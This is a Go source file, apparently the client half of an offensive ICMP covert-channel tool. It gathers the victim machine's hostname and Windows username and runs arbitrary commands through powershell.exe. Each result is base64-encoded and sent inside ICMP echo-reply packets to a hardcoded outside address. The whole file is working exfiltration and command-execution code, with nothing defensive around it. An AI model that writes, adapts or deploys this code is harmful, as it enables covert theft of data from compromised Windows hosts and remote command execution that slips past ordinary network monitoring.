// This is the code for sending individual command outputs over ICMP to a pingServer
// Use the params defined at the bottom to send commands to target IP

package main

import (
	"encoding/base64"
	"flag"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const targetIP = "10.20.215.194"

func GetHostname() string {
	hostname, _ := os.Hostname()
	data := base64.StdEncoding.EncodeToString([]byte(hostname))
	return data
}

func GetDir() string {
	userDir, _ := os.UserHomeDir()

	// This is the index, removing C:\Users\
	username := userDir[9:]

	data := base64.StdEncoding.EncodeToString([]byte(username))
	return data
}

func EncodeData(input []byte) string {
	data := base64.StdEncoding.EncodeToString([]byte(input))
	return data
}

func SendData(data string, seq int) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	//defer conn.Close()
	if err != nil {
		log.Fatal(err)
	}

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 4,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: seq,
			// b64 encoded secret string, below is "Activate"
			//Data: []byte("QWN0aXZhdGUV"),
			Data: []byte(data),
		},
	}

	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(targetIP)}); err != nil {
		log.Fatalf("WriteTo err, %s", err)
	}

}

func main() {
	hostnameOption := flag.Bool("hostname", false, "")
	userOption := flag.Bool("username", false, "")
	commandOption := flag.String("command", "", "Command to run. Results will be sent to target over ICMP")

	flag.Parse()

	if *hostnameOption {
		hostname := GetHostname()
		SendData(hostname, 1)
	}

	if *userOption {
		userDir := GetDir()
		SendData(userDir, 2)
	}

	if *commandOption != "" {
		min := 0
		max := 700
		rand.Seed(time.Now().UnixNano())
		seq := rand.Intn(max-min+1) + min
		output, _ := exec.Command("powershell.exe", "/c", *commandOption).Output()
		encodedOutput := EncodeData(output)
		SendData(encodedOutput, seq)

	}

}
